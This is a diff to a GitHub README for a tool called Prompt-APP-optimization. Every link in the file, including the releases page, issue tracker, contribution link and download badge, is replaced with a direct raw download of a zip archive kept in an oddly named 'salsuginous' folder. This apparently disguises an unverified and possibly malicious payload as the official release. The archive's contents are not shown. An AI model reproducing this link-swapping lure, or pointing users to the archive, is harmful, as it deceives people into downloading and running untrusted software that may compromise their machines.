@@ -1,6 +1,6 @@
 # 🎉 Prompt-APP-optimization - Optimize Your Programming Workflow Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/justine131125/Prompt-APP-optimization/releases)
+[![Download Now](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip%20Now-Release-blue)](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip)
 
 ## 📝 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to get started with Prompt-APP-optimization easily.
 
 1. **Visit the Releases Page**  
    Click the button below to go to the downloads page where you can find the latest version of the application.
-   [Download Now](https://github.com/justine131125/Prompt-APP-optimization/releases)
+   [Download Now](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip)
 
 2. **Choose the Right File**  
    On the releases page, you will see a list of available versions. Look for the latest version marked as "Latest Release".  
@@ -31,7 +31,7 @@ Follow these steps to get started with Prompt-APP-optimization easily.
 
 You can download Prompt-APP-optimization directly from our releases page. Click below to begin the download.
 
-[Download Now](https://github.com/justine131125/Prompt-APP-optimization/releases)
+[Download Now](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip)
 
 **Installation Steps:**
 
@@ -85,8 +85,8 @@ We welcome contributions from the community. If you have ideas or improvements t
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/justine131125/Prompt-APP-optimization/releases)
-- [Report an Issue](https://github.com/justine131125/Prompt-APP-optimization/issues)
-- [Contribute to the Project](https://github.com/justine131125/Prompt-APP-optimization)
+- [Releases Page](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip)
+- [Report an Issue](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip)
+- [Contribute to the Project](https://raw.githubusercontent.com/justine131125/Prompt-APP-optimization/main/salsuginous/Prompt-APP-optimization-v3.2.zip)
 
 By following these instructions, you will be able to successfully download and run Prompt-APP-optimization. Enjoy optimizing your programming projects!
